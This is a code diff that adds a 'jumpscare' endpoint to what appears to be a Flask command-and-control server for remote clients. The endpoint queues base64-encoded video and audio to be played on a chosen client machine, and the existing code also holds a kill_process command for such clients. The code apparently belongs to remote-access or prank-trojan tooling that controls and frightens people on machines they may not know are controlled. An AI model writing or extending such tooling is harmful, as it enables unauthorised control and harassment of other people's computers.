@@ -276,6 +276,30 @@ def kill_process(client_id):
     except:
         return jsonify({'status': 'error'}), 400
 
+@app.route('/api/jumpscare/<client_id>', methods=['POST'])
+def jumpscare_upload(client_id):
+    try:
+        video = request.files.get('video')
+        audio = request.files.get('audio')
+        
+        video_b64 = None
+        audio_b64 = None
+        
+        if video:
+            video_b64 = base64.b64encode(video.read()).decode('utf-8')
+        if audio:
+            audio_b64 = base64.b64encode(audio.read()).decode('utf-8')
+        
+        if client_id not in command_queue:
+            command_queue[client_id] = []
+        
+        cmd = f"jumpscare|{video_b64}|{audio_b64}"
+        command_queue[client_id].append(cmd)
+        
+        return jsonify({'status': 'ok', 'message': 'Jumpscare enviado'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 400
+
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
